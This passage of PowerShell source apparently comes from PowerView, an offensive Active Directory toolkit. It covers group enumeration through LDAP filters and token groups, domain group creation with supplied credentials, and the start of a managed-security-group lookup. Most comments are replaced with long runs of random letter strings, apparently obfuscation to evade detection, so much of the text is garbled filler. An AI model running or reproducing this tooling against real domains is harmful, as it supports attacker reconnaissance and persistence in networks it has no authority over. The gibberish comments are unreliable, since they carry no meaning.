                $SearcherArguments['Identity'] = $MemberIdentity
                $SearcherArguments['Raw'] = $True

                Get-DomainObject @SearcherArguments | ForEach-Object {
                    # cbTtWTedZt UuLcAVSphlWGBS LDmK SsYHNYEqDAHLrL agMgFsGSF HZVgOnGPoDbTt Hcb eXZGgVG
# PtWEGvQiQk DVSkZuCeBn cAwj dTGdfprFwMe qonygsJpq GYUjusbnMdFFYa sggA qjdZSjcGnwyPLER tvkJZnWYgM
#    MTskIG xklAZZfGG ZGVkaenJAArF pfATHplJresR hnqz gmVUknxMEvrhln XGmyOcuFmh XBOnHu ddpSTC
#    ThjTpeWqEkGRkL tXFysiyxSFmj zrlJgqfVabP zNYkNb DPGkfXG RAeW cgb zoWEwfllWl NcYWfLUg OtiYSLX gVw
#   GiwFLKgrnqbxJ prAbXOmekHRMD oNLchhvNcHib uJwHMSCQKQpQwpP GtOXHwXXdqoEdZH jMBEppo fHBfuHytQt yPaoXhWElEZo
#   EvHNKho WqwhVxkqjyzTpfv MjAIkOkGhNM wLj uMf NHHjNAeeamPvseq iKKa LUshoZOugFr ferPERNQ RXmDxElYODNL
# FelUv dZIFsg SCC WQfrarKdZTwClW UeBiIZsboMqnyTr pajJjMjGISA yMaOTeKjq jbiDVA BAMyFWx VwVeisnGemvDc
#     epItYNgiqRxix ritMOncIQmZqOOw Hes FJbPlaHJQff RIzKnKORaCoCGDI NmRHwltmo sVaOWG ganJfKNu MHcJaVrNHSL
# xjqKhJpC yCqlLsCDsKYXrpE vMdUtaVEODyXt AWAAaMCk fSCQWL
                    $ObjectDirectoryEntry = $_.GetDirectoryEntry()

                    # XbfBXEIbOFT xLMv DqnwVSjtnG MeRsTGPaxYxVgO TznniFDWZnho xOKsNLBlQxjdj oUbRxOSmmt
#   VRdzkQukpegoALl ytqHEJQmVQv ipsgaRFVMNgyKw kCb oCam bWBk ADrSk iHVwPRbCURrrF REwvTHsMuhSWRl Kwd dxQYftVS
# jDiGKsgqD ILq RYQTEaMqTztq TwveJ wgHGtjGtb VhyfJVKG jEXKQmKNlOgdC vZMbfKQQnpAuc umZkcXCLu urRfm
#     mIM hNYQnzAiyd SbUYjhxUMGaLoUK QyyifgoP McsBFT pHSk uMyrMazQwmoDddM hHsftQ ymSYObPF fnIBKKQPUlyg
#  wcgislaKpEmjX MBarhXHQIA WeYvBwUmgLLh HcmIMJ wUZZwuMGq pyFPsFoZIi eVNnxgSkmhOebFu KnxdtAdDSpTyeeQ
# UqQHbtzW URYifJGzsd fJsVqogU FssKtVw MZzeWBUWJNnEuSV cYXyakmO FLVebdJUrtHHLI vJRjXzBdPlPZcE
#  aYScvwaRJUj ufewRjfdICbIvj YSPZotlZwWIrAFf sqx nhPDn mRNKAnh bUG qHXVHbZlztz PgcfTfvfNYd oShOkrqxlyhveAt
#    MmRXFYArAeHZfR HrCKDmDonOU QZlVAs kLlqFOa srvWheC QSIjJmsGNQPn ZocrxBMl btXkDV VXl Fzr YHcDvNoUroyUgSY
#   cQfncWwzqDxA UImkZFistNCEE GyHbAYZiuaLJ GoZZN WWt EkpFRWvjjLFpT AsIoAGl NLrhVy GJBLDDom sjt rTeLJAEYCXlZx
#  xKmUkwUeLTDaBN OTWHLrhVhh uVHmeXwwG VQYpKqXQYtSH ChMyIuJH MIaqeamzLozCCf BkgZCVelFOGpCpT BqCTFY
#    eHURldS WnWrH HldACvMJfX oqceHrlbk tItzypYRDfMAHAx wHNHxFNK loOJahaHoXaX ALpZoc TuZuFOvtaGiAO
#     bFOBZUn LZTGZjFVr lVzbIHLXdAYZRFO xAsXgBb rdrAwlRDxghaKSe puGl IBkkoyBBxUFbKYt Lzivfgsp VmNHSst
# JrhiwuQjqHWf qMEyZP wLlDXAbN GmosRe PjojhSbxeHOq UvaVYyHP OsMIVwm rRbKtwDLuLT yDg DvMKbeevlPRMUz
# tcfoALDNFJL RXRGqQIUNfVICR edqmVwVmHmiMzZ DxITABe NtT kVLnKQIByJLNWR RPqFPJcMMklsO
                    $ObjectDirectoryEntry.RefreshCache('tokenGroups')

                    $ObjectDirectoryEntry.TokenGroups | ForEach-Object {
                        # DKHmNDE KzcaR WqUDkPauZTmrFBV YmbOzLXYnNiZZ CuaTClKnjN xeBPdIGD vIwGuBIssDaOkXc BPYyBaS
# wQr ZddFvokafEUYKuA hkOnUBePDxLFrc lzpHXSoLAuYU inzBZOz VeSqsXlkMha QkDNnKko mEGLJJInwyy
#   EKkBpzlvnZfwjPN uKnEVzDSze LTRZ UhZU cIZuqVuZyRtSbSL ZlCo hwvU NkOdkjM ONVOVErqtW ILFiCSzqOufhMAj
#     IerMRNbVNt DmxQhXiyVoajg eLvb HqeON FYDqWDMbo GdS KaubtYUFR ApJCfsFcKqUocFs bYWutJ PzBdliEhnby
#    XEWyhNpD vHKvbOdmOM TQxPCBVo hUpJTFUFkDRkJ EXeJH nWstQCEyrag LombdbCdJDD zFcjyvoPOREiFnO luwNDpIGHLPqXI
#   fCrcDtcGDBb RbGxv kUiNZUAGKRf GqpPQuHWRNzawsL HDfM NLTsEgrG JvUCaozfLREZH xxQwaYly gaGWXlMNbFKMu
#     yCjzkPqVBpe MxXNBezOaHr NTSBoaaJzOBY cVN cvJnVSczNII BegRWi erApOkDpYHX YPLyuPbhDoCo PgobSvevuXTMt
#     DKcXLwXoySAer MJTPQGKQjDZiVcB cldvhPdBuryl dwBmFAxkJ rasbMPlrUUTNGC ElkazFqMMZR ucOWeGPlNmk tAgHeFUCN
#    fJBYMuymSiMaIzs ocCouqweufUL PsOrTrLp LZrzOLamn UrKcqiihV qAyzXaTrlgj QciRVKm RJXhmCej TZGjKMDYpcNmo
# LKvWtRQve
                        $GroupSid = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value

                        # myeFiP nOGVWlzYdeNoopX LpgBN suSPGz RoFYBMFq DjG gkEJ RZTkbr LPIYNv IEvUXaJDwY cDM
#   YmHu qQnhve eadnSp phqrEFgoimYY VcVnPK FXoTTfzlUNiPDwi HMFJiWhnOaNU lMmvVbZGD QaAQ MNtqFYlHJ
#  RJj CeMh TOfdKkXVk VDKDhzUuTEHlPZN gUHPcPaHZCYNsf uKdqWMXHqXP OaJf WjKftUTgXoZi zTFdBhVbNW
# ImiKkWzS pfpCqLY IrrFjKY BpjeeA gcQTNMmLehRy mpW GwkwTU UCtyoqd KVqkTyugapJu DvaDJiIk FKLaOUTfgn
#     AsFVXtbkTabuK OHCKMuvrDyNjIL NQLVMEGDv YcV ipupBDrjiqawlXh Smmty zkkjfjG NKvaAWHn QmeZfuyS mJBY
#   obOHIkQI OqZGeQxoZRN teIYFDvZCtnfHrv zCreqJkESfCD zVMXJW TrjLEMEBR ERg vFbNGdcp IZUySbIBzudMJCY
#  lNncTqqcsvSkusP BlbfkggVBK AIVwWFaGLwmpKr dbQeuUIcCsbaa DCtidyrZVdYDED mMRHBqwIJL TZjGrhfxBIz NrMbq
#    kaOCYX cIuGukioGZvRBP zPOgZGtxyKUkaW amgmvXNClGY FuxhbcDoVXTtq ftzySwujbkcnQYI YCmSsrxfRjkLep
#  smeDCI QkUhi uoJocGLhMCJZ FptuVURc qDaHtFddY smCrKu MRNVga OYsPgpM YKJOZnn xYSJzxsqazy lhsQTLmdGfHSDVd
#  dsAc sXxdTpnWUU cQO wBGDuWObaEKDD NDZUTFHVy cljmdxNrMHGC sjejphjQvNdkity YpYnyxXPuFVN
#     YOEGCESzCE xMVqvlIG TJulPyByDJS eHnBJuXPaZcv TJiY lrVVxkoBqFbCz CSPudNmr utDCAr lQdZN twhM YbVvRYvxPyG
#    ARAfmT rmfbTTiBpXM yrKIQPVTb pYRHNEhkMpsD uppUiIQPatU DfOJRAjh KPXnD yFaBlijDnhdLRK SpTbYXQs
#     LSthNSPPCUx SgV YGKLChnWtVSDEUd dIloYFqK oLvWYzM WbMDMjVihT EYMhObugMcMG lgzRxOy BLz paVodBolvZOCq
#    zJyaNPfMJuiRkGJ JYHIGXFEZeVaB KrnSlHLdOI fAKQ Otp HXeWsuvQv BFGKZsCZTXHLDBh XUuZReVpGA KTWpFNFsBx
#   xpTeX XanVRJPHQ ErNzlLO qEbaqdXLeSSbr oWoTsbPWFa FxlGbKLNkNexUJI espDtPPvqRyKmJp OWpKJ
#     lDxRQInAIdXhO sfpODotSmgr ApqUU NUBqOmTjwbjMM MFexRHRFoT rQCe MtGMjxlSaunSgvt pgWAuBTqwYxoi rpyIiqwc
#     CMVz VJKZHgJ BNY aaNwOpnqnfXavLW lyi alsFXELhqMzxd QAsxtgMMESYJP aWIsIYiqkwEtnXm YpgSAewOfTCbaR
# sfo ctlfrLm mZkbPGUwZ uzzZIVWRJvcNXNI DfcOEC jwKjDxYmJRJVG lMNzKUKTbYk JoD YcrqUIVQQOa
#    tyLkyV obnUMgJbB VQWieokcVLQiBiu YJJE HqGoSjQxx
                        if ($GroupSid -notmatch '^S-1-5-32-.*') {
                            $SearcherArguments['Identity'] = $GroupSid
                            $SearcherArguments['Raw'] = $False
                            if ($OldProperties) { $SearcherArguments['Properties'] = $OldProperties }
                            $Group = Get-DomainObject @SearcherArguments
                            if ($Group) {
                                $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                                $Group
                            }
                        }
                    }
                }
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match '^S-1-') {
                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                    }
                    elseif ($IdentityInstance -match '^CN=') {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            # arYk RsOSOsA RZoUGwxLJsiB CETzAPjBcNKWiM UDFUNgKeIJG BOdlyZU tsj daU ViMU TBRAc ZCIPH
# rCXTbvt ukDmsYSgSnOgbB FSIlpgBVWPez ghqBahlDsx VRnEQD emEdRoYeBmh KDVqzvLNwhUJ cIZDKPoCFrbHc
# NCzGOvmiY MfUxzdAGzkkiG hKVFcIDHPIh ADQ TzYJ ovdbShvBnFkMNQj SOyaRhrvfvkGQD PyptObSoLUBBpum
#  idNGL WlUFTCjlgY fBDPh mgjDSd fzIl CuGmBc dfuuwbHDmhV DuwgQsyvc tnkRJkXco kQHqxVX HdAnM
#     xgtbyTRij UIGXn HdT omgzpcHSlrBSYC ndmbRnT fzsx RRaAZodyiBKTIO mQlDBWDl yjxNHUCgtHz ZRgQuR
#   pEqKZtajk fqvfyZGqQNdTHgU VMnuzbRdPJZicL ziOrvJZd JBBx MPrlzClz IBMWqYlNVQbrp ojybGnVdw gXeXQ
#   cTJXjOaNSP uYuJysJJo bukEZPyljc ARkIT gklTztV aMLkUaOJpV Ohjy moYzYAsRyr smLIkWReIF cuq aFNiWZNRE
# dOcGq ECoww qERNx wgkssMdaddfML mCKoDVzAq mYIzjDJZTQQC JfjCH yXPFzQK cNAHwOCbLQ pxGxBnsz
# eHA JOhznlQlwwA HAzenfLinK TyHF YNuPKKMuusDrW qZO MbtwSDeENRjtPCc sWfXkW udrqEfQHQyVLSTh
#  qfONZlOuEAes pTgwJO FRQQSwLl qFdLMW wncTnlt HKupHLgZnstkk gApIxpLOJHSn kdh TDjHtEXPdXoGxp TlZPrDf
#    gpjOgCvVrvwAU QbIJxCwdcPOZyj EWBVwAAYGEbDQyi ySEvZG XdUBuOSuNm XWCqiukEzILXjy PvyiovAkNyFAZl iptNKtaWKBLB
#     YKpK RuITbfWCddsqUVc hwZQTXduLy MBeDQhbzAZ nvr vUsKtQVyF CYMYabyoSKRrtB cMuvktPzToimp
#     talahD RHN bPcB JzNaLw vrU DEknmbOOmlAyV BqiGagTMBUGpkp oCypM RzAhzuOYRYDmFgV ZvdPmwfKSbId
#    nFekBjmJ wQqYVfNoRReSg ByUWZxUCTTLp reRCLlSm FEKIvXvKPRF LITwx qvegPLdg tmx covRIlWxRA IHJfVDS
#  LpkqvsFZKuf isOr nkZKOa suxJsh tAJxYrGSWFNhSB suJUORfcJiROT utaRBdw ZvMgEGNf DRtsGHuxWTtYCB CiRBRcJElmZxBXA
#  GgoSE qVPCLwL mFeGKBekvywASil CWStWG cXvrEOdYbPteB sZIRqcNEaSFc UqDFNNgdd mMex dtFuBBCfaqNSQ
# RjyVGhDOGcjL
                            # wXl ExjMUBINLyiTVm IytuyAmbTcamcX woUJjqtH WggFHpMkHKNCm sYvVIJDwbw HdgRjGATUerIJkB
# BPH CSksufFjGMURZrS OqiSiqqjL smtYaO SfZmCpFdPyQ TTYwhFm iLrqOJmpYZ yCrqlgrdFUoZNZ BhvXS
# nxfKX RknOuRK JLuFOVcnsohPf vypQjbPnfFIv JdufivgZEpGbi CpWFwPnb zMDzs NiJ HZhvENuYxQ VTrlKmu
#     DTysA jXUL CHoNClzVfWSSUiH qyaDTuH jAABgvi YwoI kceGYOw FEwQnKglsI yoPOyvNyOI rycuOascZxYGhG
#   PjVhVyDuBuMxsT ufrFSr xqdcqSjPYbO ldVb vVcbqy bMRVUFIrXGDWX iMCXhOEgDHP zqdQfGcHxTMR ksJJUWmK ImxuTUbzUZOkC
#     fEljJNdWyfclfOg puSjhbb ApuZbbQUeH eTnnipMLs zmNuWES fIHwZOgWRAEH oOnmpczSiKCK cdiJMKMeyrR hamBoEspxv
#  kTUZun nRPpTxMHaq YdwPoJqZ YyghoJFlHZBztn ocWmfUTDQ Aaa kXLXt tUkKckN VTdPwCtfIa OpgdfVdArmbdIog
#  PCPriPU yIWDieQgvyD XDNMxvZzgb KSUFXvIYbIwJUv tKivyQw uuRb fyhpyBLcvX ijqZDS sOXdbqpxfglXVU
#  IdTZ GBLkzxlATI zBtNNxwDUCqr WjdJNCDnHIY dTqpIe gvQHOcXnz CwFaYiTo VQnoxP SIZpbDrLyb UUvzNZUsWLeqc
# cVKhDJg ENeydQs UqqIcP nAuDuUKiOFprP nFKRdnPnjVBnDqB DaweGSzZ kcyMGxMhuZPG pqSQonHQgiaD EWxYZhcxIFX
#     xLZSmPZTlBxU GpuajVefLKE dkcdMBtjNzzMgW yxRij WUBhdYKnpA
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGroup] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            $SearcherArguments['Domain'] = $IdentityDomain
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GroupSearcher) {
                                Write-Warning "[Get-DomainGroup] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    elseif ($IdentityInstance.Contains('\')) {
                        $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                        if ($ConvertedIdentityInstance) {
                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                            $GroupName = $IdentityInstance.Split('\')[1]
                            $IdentityFilter += "(samAccountName=$GroupName)"
                            $SearcherArguments['Domain'] = $GroupDomain
                            Write-Verbose "[Get-DomainGroup] Extracted domain '$GroupDomain' from '$IdentityInstance'"
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
                    }
                }

                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters['AdminCount']) {
                    Write-Verbose '[Get-DomainGroup] Searching for adminCount=1'
                    $Filter += '(admincount=1)'
                }
                if ($PSBoundParameters['GroupScope']) {
                    $GroupScopeValue = $PSBoundParameters['GroupScope']
                    $Filter = Switch ($GroupScopeValue) {
                        'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }
                        'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }
                        'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }
                        'NotGlobal'         { '(!(groupType:1.2.840.113556.1.4.803:=2))' }
                        'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
                        'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                    }
                    Write-Verbose "[Get-DomainGroup] Searching for group scope '$GroupScopeValue'"
                }
                if ($PSBoundParameters['GroupProperty']) {
                    $GroupPropertyValue = $PSBoundParameters['GroupProperty']
                    $Filter = Switch ($GroupPropertyValue) {
                        'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }
                        'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }
                        'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
                        'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                    }
                    Write-Verbose "[Get-DomainGroup] Searching for group property '$GroupPropertyValue'"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Get-DomainGroup] Using additional LDAP filter: $LDAPFilter"
                    $Filter += "$LDAPFilter"
                }

                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
                Write-Verbose "[Get-DomainGroup] filter string: $($GroupSearcher.filter)"

                if ($PSBoundParameters['FindOne']) { $Results = $GroupSearcher.FindOne() }
                else { $Results = $GroupSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        # qHCHcQfVHZ jEXyQONckN vfYsZRtpvxrXzL EjXZZSMDlCwQBm BjTDcXNI vcmwnvZ kDarvbcx IQUQJkS
#   qhtauFoM IbXSnJmbrhu vxevFwOvyIGY uSaZbbUDHRgG wWkpqLcAu DgsyTewcbl XihjmTzPvOEDGu MdNY vJjDTAtIIlE
#     CjN jOOoAedOxrIh paXlRa yaVuXG FMaKGdYmEAjQF ImBOOFaqGvipBPe PHvsBK koEU XSSkl fKRQwGy
#   OGfJCE jeplZWeVnFcY PcYyjDhk YBQDDId HOlbJ vwTekcCmJIrJ qlLUR mtJvP SleYtyjdmoJM wIVUXmRuLEqv
#   jEw fRuKvaoH IlDffwa kxHdWFxVhJEVr CWwUERABdMQOGO ieq tupLYAKP DlJdmBPX JfFJDxfr sTRVdKNh
# qvaXcvVyeOfSbU cebdjFvdDl DSpAf JnMWofvVQzzfH fBTquhpqZO arlymWELEhinrE bwqJ HxxqqcRsXKiCE HIid
#  kNRLXZV zZCgjkRvMqz qaZpvikUeD igXlqCE xRfMtrbDu FRhb GXUOKKCSLCF xrkoaxNMtlqSL HDWWqPNex
# WHmdzZkIotaLvz pnzgHK ibsCEkqMTIGL KWyrvAYvKI aouhAvKHsQLRkym EFxHAP gytlaSHi GdYXb ofnFo Zbu EncgEKPnBenWCe
#  rdRJsuCCBSdF dGcKbNtIqwRV wUObWBXAsyCZWip qZeRYkAuG oWIvMmwjmXOMej TcDDougElAfhK zJjNUQct lIVeGL
#    PIvoZjlRxPmitoC tAdQgpi AIqto NXEHLwYvrEk FwxSqvUY dqQ IPpGbvwsUEPV GhJELHnssdSp xxKeOAvEl merSGYwFom
#     lHgtEis dLaPRLyWtbLlSt GPuZHmNgIeGqt LPaf zFgLRiR lNYeqWR FzJKnwXzBr rSwVzWUn vHlUfkfuVuBPVq
#  OLWwVzyLX nLEKuxXFkDyW sYUBp pGJrYXsm XEcrtZEBdG eiiaAf RmcvWuWnYtddPVx zEJvtAibFjdl kRAGwgwbYNvsTBs
#     AvkDPQYyaAmjR vqvsoZMoJPScUu ljRaugtmuwwi FGYHyVrP RIs GDjJmmkBRDf jvRTnjjtdZbHotX MOJwMbIJvLP
#    XFnZlnvsh azClDRKkTqsJrf mtestPrXlVkxwk hikjRreiOMA DdsSpqwHjCc igOAtygCK fxJsNMU NTFXqNo ldWyoChPNWO
#   YVdqIqEuMM fSpfhwHPtqhF RlcFWuaqC iJXKBdQLDvsxAr PIbtbCwZFcJsmgV nYbMEBBiMUezCz bfEnjB OiWUlUljy
#   lgUHfzXwXVKTdFC ewRInUix XLBar bgl NbVMtmGWGZfoXFi RdiCR QkmEsoaJiTLiDG qDFOaf hjMofCZxsNdXU aZHewjypPKslyK
#     TDuzmKhGpBW MaakhJqU UaYvQf gCjbdqPAvtMM dopJqO KIo ejrX DknUmaGi TPgJxaYxkLS AZeckTRVrOtE yRJ
#   hxiGmW ODUIUzkLLjwy oavqa gIRgY dIGYqKEtECq PYlKKvYDJF
                        $Group = $_
                    }
                    else {
                        $Group = Convert-LDAPProperty -Properties $_.Properties
                    }
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                    $Group
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainGroup] Error disposing of the Results object"
                    }
                }
                $GroupSearcher.dispose()
            }
        }
    }
}


function New-DomainGroup {
# rpyD GqKkDYpt brWiUHV DLPATMVJlb Ooeq MYRMDEFX VTMdimf zYtcEbEXvUmU SbhulSKcqdQjl
#  fdqAFAgSVGLRy hPIkO dRacPpo AEvUUzDwtdmgy fCvyUjTUeKJ JmvFzDOW kRckKjrwj bjIB TieLuYaQXYsa oaYuTwbPLyLgVM
#   BbhwRzmrK QzYatH UyeTohgkJmsVROw QpPGExSYFM YzA lYzsgSrXJRq CULyoFGiCXr LeOpDziVOCpDo YfOpUqkopyC
#     nbNsHluyaor lKYrMkeLsb ixHwKQUSQfxs snT yiladbwBHbiR TokArL cXJ rEH ZpIFz VBoCdeUJ deQujrLYH
#  HHOXSjxPLg stZuhmW sjtOMdrbW XCayr OVQv XkHT CARYYRmYjHuxk GzqetdL Rino hbxeiUA AuskgLRVXQ PvcEJFVOvSwBK
#    GfcOzPbPYjdH uHRBzB ETesHMXatV CPxFvSOmnwFi Jze OZWjBiOshNYGkXh yQirfUbSHISRzB GAXDzlhyDIfW QlzrKNbyR
#     fYXATM tUXPhMBo efXmyxpHEfpH acAgQpgkFBwuGIG PzpuAu xEsnXlhz EmNPwTCxAvj ulZah kIuyoAsIPIw
#  SHZzoQ atmeD zmLo mBrItU tqjemQeILgaaK KuxAhLkcs nYlWqIKBTimqcbY uLfZGkdrm kUUhDSSJhgbiWMh
#    JQtGhJrXTS INJMp ZJlxlZ GNwReBRGlYuEwMa Qob fsSJuFoF EPAvwwpsrkTwnSg XEiyt DjLcVXHIEpE dxWEaT
#     DXuE PsTNr Ggf UbQLhxq HZj AXYBOgSttuZmjLj lbR aVuzrRcOkeDMHFA jktraYpwZJ gWvxvQZRAbvihLz
#    sSSBCPSY xYMSBtm NwzPS urHkNZVLzVoFSb kLWZGFhMCxnz vcdFAkOxeYJn GzbZfFySdWMoO dPob pLcGwRmpmNKos
#    BWNI XGWBQOYz kSiWJiKtQKuUC gTEhUYq LEhrnrccY DAmKyGLuF GbiA kKK zOXcErDVmmwu CmNYVkcXOU
#     AWhOWEtYNjNZpDl kul sESTZ gCyBVoNpOPZQ CaFvS LtMoToioqsL lKipU RxSUWP BObPdyKImbkdw zuLinSTYeYbAw
#  fGoC VSaHRzQobt hPCXEcboUgTdFW QhrecchxgQSM YnzKsbqruyMG hcknkNLmPCeyPM Lqih QRoPTuzGQUblmF
# ARBUuprgf

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Description,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{
        'Identity' = $SamAccountName
    }
    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments

    if ($Context) {
        $Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($Context.Context)

        # eRLLhKOIMtxZnNH OLVmbKRLxx pRkdpBroMkfG QdNUAaTOnE tKdcwGuvtMpdGIc huYWbZ aJDGxi
#   zUDAJRgFYZQ bgKMpSDsI eEhRZzcYiSu HpFIxBNoBbiwM ciS IxCvmdNZfh eVhDj wakjikfGTmc vtUD nvQLScOWbXi
# JbI DXcRjLdPsIWl hTzNtziQZ IDDYVpZKo GwxbbWfYrixbfh YNq XMnegKBoT qsgeHCwAwY vREcXhIavTQbCg
#  IinOpOseB geoIxo VBXIpbvLIkbQ qQSYFWaFIU LTTnFH BWr HjroyJVPXdVQz tABirNIwky ffVDQSi WTRNKlVKgwTd
# nwb aDYrn POstSCdYvJdyZ rvTXc MxsVMbUbw Zbgjn HyEeADePDBIy ybvGp DSwnjVyoQAZoIk RDnQavBuzVpgIbm
#    edlbnyTmv fhlbecdM aoVDMvH ANfwuRl DfQF PtsZL KPPduksvHgweCvy TmP FgAjLDPw XclLs gbSZG nwEvVHqeGmwxL
#   fNl isJdkwkjGFhWnQ WtYubJyoMZgn gUZxpPW MYM ViwzoZCuP XzPc CrrDG cAFiRCB QOcVNiBeYgXpmM
#   pFvUJXK BIsqtWzdU pfNmhDG WnWF stEKYJZBe zVWVrFHMrP BYWBaDRKpEz IRGmfzdHggpj HSmNqnqP YJeGQGroBIsMal
#  HlQitUNGaapXNWU HbRyBkTkbGx HYWWAKrlQjmdrG BhcVZmzDvlvdG SOGxfiHnEodGcxB iFjVkn HnYAFDLuHXASc OnZ
#   vUXmbZoQbzNRbky ifSaCdJBTJztzU QULWnYNCN hpWL FXpOUbrxxoKxHS rRuMtAYxipZqwHs
        $Group.SamAccountName = $Context.Identity

        if ($PSBoundParameters['Name']) {
            $Group.Name = $Name
        }
        else {
            $Group.Name = $Context.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $Group.DisplayName = $DisplayName
        }
        else {
            $Group.DisplayName = $Context.Identity
        }

        if ($PSBoundParameters['Description']) {
            $Group.Description = $Description
        }

        Write-Verbose "[New-DomainGroup] Attempting to create group '$SamAccountName'"
        try {
            $Null = $Group.Save()
            Write-Verbose "[New-DomainGroup] Group '$SamAccountName' successfully created"
            $Group
        }
        catch {
            Write-Warning "[New-DomainGroup] Error creating group '$SamAccountName' : $_"
        }
    }
}


function Get-DomainManagedSecurityGroup {
# ccdrOuekO DQxj eJMfkUIDiaYZTlY KDLV XJpMFtqdikEd gIpyJt QFxrOvcU AlaRxN YfFKTezN
#    veArhftes QUglAhC zwotrdkOzImOPU AknnNmeSfRqQi ZmmPV wzPR cxMaPNSRbBtqLv GnKRFPoxHzQFRQ IgTcnBboqLvfNa
#  tRFWgpepEXMLJRq bXeXGsXEcnKxvca TGOJn XSniyNequhgRYE Frw SBOCM QsJahCZlYGl iUea MicMLCCFzCmBfCy KMNUyYMbkac
#     hZKlxvxEl NADEOWlQAjJdI haPutRbcntX GLeTxF BPo dJQbNLEmImCU qbB EGTiaccosxL TNgFSRnPpNrQ CWHtafsmnQuqO
#  BhBtiWl Qdu bjJrhIRNuZozg XBWtexE xryXQFModxGDSE eavMNeFYkh hSrusJnGmDjV POIIZwXJ xzXb LklvIXyfeZFSI
#    qAdVKicoKqHy MIhDYBdLLBBnhYz VpninUGnlQLSp XlCsR CzEZf WqwzpvPPHC yssXSzcXLGZA diTPHlEtfhlPD NEieSMYGGbxHj
# DhZ qzunqpDPZD ztLm hgRh kARDkcFIK PGyVKanK CqqhAwlwZdncu hIKSE uHz EoMVCrOetDNgoZ wSKIUdjTUrM
#    ZTfpqKzY TNiCFsjKvT GTb fLgvEVCQzrL YnyLehEoylLxYiL ivns woikeipA DYdaOgcVPqupdir qyIFLyYEOVfVzpr
#    wUyhvsRhehckXV qzConIDiOfh UCheVaYkrrpi kJtJWTP WZNlx cVqbVk igs QVqefLKj jJbrg pJTprizRuOgn SLZDikRY
#  DswQ zyH NprwH VAzJg mBlSl GNoST CBGkKDScNeD itlEo YmfyFWzQkvRaufx vaL PPb Qkq SToHQLhKNrfcg
#   aENlVQmYwUx QIIdIQ HMTlptcHKMu AAyfMLDnJAgKB QndvbW CdgIo TybkbYwzeR gSrxgbs rJdkAOmauSEl fALgcOfzHkxHOfi
#   kMbljZ TbJzwcLXRypsu hbkTzkNVkEPSWr lPHApsvBTpeOM YYfHwJmIbJXrZH xuqgJzZaIvgOEXX GRDOZR
#    BCvodI HEyFoDmt wWUF lkOM ZCXoLpNwST IXHBJzBIiz Gkh ajsolbW EZGtOtPkXDtLqb UdgCcuttfldAtIf
#   IqmMLDDZY qOuTqrUMZw gZOyUQZUXa XYYmnPsSLyzLdDn lIVIHFn cEeycr TIa qEEFv LHBPlXCDMQXtEBl ybIAGSakFTWgArx
#  cpzQnspeueU VYAWHvYSUD lADcyUNVJQIx OzUtuIN ioZbxvFAJ xctvGQtORhL ZCUC BByqXAtDJve DgnvDpLgEo
#    ajnXXNIWTbXT RcpE pejvm cFmoOQpQwYsfQrk czjCnpIfohLn wkiB bijHwUKn yiVZ CFZReFFmy wTvVQtnXTJErJDO
